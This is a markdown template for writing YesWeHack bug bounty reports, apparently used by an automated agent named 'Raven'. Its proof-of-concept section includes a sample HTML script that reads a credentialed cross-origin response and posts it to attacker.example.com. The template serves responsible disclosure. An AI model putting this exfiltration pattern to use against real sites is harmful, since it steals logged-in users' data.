# YesWeHack submission template (Raven uses this)

## Form fields Raven must populate

| Field | Where it comes from |
|---|---|
| **Affected scope** | finding.program.scope_match + finding.additional_subs (multi-select on YWH) |
| **Type / CWE** | finding.class → CWE mapping (same as Intigriti) |
| **Severity (CVSS)** | finding.severity.cvss (CVSS:3.1 vector) |
| **Title** | Raven generates ≤150 chars |
| **Description** | Body of this template |
| **Suggested fix** | Populated from Remediation section (YWH has a separate field for this) |

## YWH expects formal-ish English (French-origin platform)

- Slightly more structured than H1
- Triagers appreciate clear headings + numbered steps
- Reference standards documents (W3C, OWASP, CWE) in a References section

## Description body template

```markdown
## Summary

{2-4 sentence summary}

## Affected hostnames (all confirmed via direct probe)

{Bullet list of every affected hostname — YWH wants the full enumeration}

  • {hostname 1}
  • {hostname 2}
  • ...

## Steps to reproduce

1. {first step — exact command}

   `{command in code block}`

2. {expected output / actual output}

   `{output in code block}`

3. {optional confirmation}

## Real-browser PoC (described, not executed)

{For CORS / CSRF findings, include a non-executable PoC HTML snippet — YWH triagers expect this for credentialed cross-origin reads:}

```html
<!DOCTYPE html>
<html><body><script>
// {brief comment}
fetch("https://{target}/{endpoint}", { credentials: "include" })
  .then(r => r.text())
  .then(html => {
    // {what attacker does with the response}
    fetch("https://attacker.example.com/exfil", {
      method: "POST", body: html
    });
  });
</script></body></html>
```

## Impact

{Numbered impact list, with brand-context multipliers if applicable}

- {impact 1 — specific scenario}
- {impact 2 — chained scenario}
- {industry/sector context — e.g. "Cross-border-payments brand", "DTC storefront", "Identity vendor"}

## Remediation (Suggested fix)

{Numbered specific fixes — YWH copies this into the "Suggested fix" field}

1. {fix 1}
2. {fix 2}
3. {audit / defense in depth}
4. {optional: per-platform-config notes — e.g. "In Apollo Server set `introspection: false`"}

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security scanner (Apache 2.0). {1-sentence on which Lictor scanner produced the finding.}

## References

- {standards link 1}
- {OWASP cheat sheet}
- CWE-{number}: {CWE title}
- {Optional: YesWeHack historical payouts for similar class}

---

Ethical-disclosure note: I have NOT {specific verb}. The exploitation pattern is described to illustrate impact, not executed. All probes used neutral test origins (`attacker.example.com`) without credentials.
```

## Submission URL pattern

`https://yeswehack.com/programs` → search program → "Report a vulnerability"
